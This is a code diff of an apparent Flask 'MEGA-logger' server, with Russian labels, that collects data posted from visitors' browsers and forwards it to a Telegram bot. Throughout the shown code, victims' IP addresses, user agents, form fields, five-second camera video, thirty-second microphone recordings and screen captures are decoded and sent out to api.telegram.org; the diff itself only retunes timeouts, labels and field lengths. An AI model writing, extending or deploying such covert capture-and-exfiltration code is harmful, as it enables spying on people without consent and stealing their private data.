@@ -22,7 +22,7 @@ def send_tg(text, file_bytes=None, filename="file"):
         else:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
             data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
-            requests.post(url, data=data, timeout=5)
+            requests.post(url, data=data, timeout=10)
     except Exception as e:
         print("TG error:", e)
 
@@ -36,10 +36,10 @@ def log():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', '')
     
-    msg = f"<b>🎯 НОВЫЙ ЛОГ</b>\n"
+    msg = f"<b>🔥 MEGA-ЛОГГЕР | НОВЫЙ ОТЧЁТ</b>\n"
     msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
     msg += f"🌍 IP: {ip}\n"
-    msg += f"📱 UA: {ua[:100]}\n\n"
+    msg += f"📱 User-Agent: {ua[:100]}\n\n"
     
     # Текстовые поля (исключая base64)
     text_fields = {k:v for k,v in data.items() 
@@ -47,7 +47,7 @@ def log():
     
     for k, v in text_fields.items():
         if v:
-            msg += f"<b>{k}</b>: {str(v)[:150]}\n"
+            msg += f"<b>{k}</b>: {str(v)[:200]}\n"
     
     # Отправляем текст
     send_tg(msg)
@@ -55,17 +55,17 @@ def log():
     # Видео с камеры
     if data.get("video_base64"):
         video_bytes = base64.b64decode(data["video_base64"])
-        send_tg("🎥 Видео с камеры (5 сек)", file_bytes=video_bytes, filename="video.mp4")
+        send_tg("🎥 ВИДЕО С КАМЕРЫ (5 сек)", file_bytes=video_bytes, filename="video.mp4")
     
-    # Аудио
+    # Аудио с микрофона
     if data.get("audio_base64"):
         audio_bytes = base64.b64decode(data["audio_base64"])
-        send_tg("🎙️ Аудиозапись (30 сек)", file_bytes=audio_bytes, filename="audio.webm")
+        send_tg("🎙️ АУДИОЗАПИСЬ (30 сек)", file_bytes=audio_bytes, filename="audio.webm")
     
-    # Скриншот
+    # Скриншот экрана
     if data.get("screen_base64"):
         scr_bytes = base64.b64decode(data["screen_base64"])
-        send_tg("🖥️ Скриншот экрана", file_bytes=scr_bytes, filename="screen.jpg")
+        send_tg("🖥️ СКРИНШОТ ЭКРАНА", file_bytes=scr_bytes, filename="screen.jpg")
     
     return jsonify({"ok": True})
 
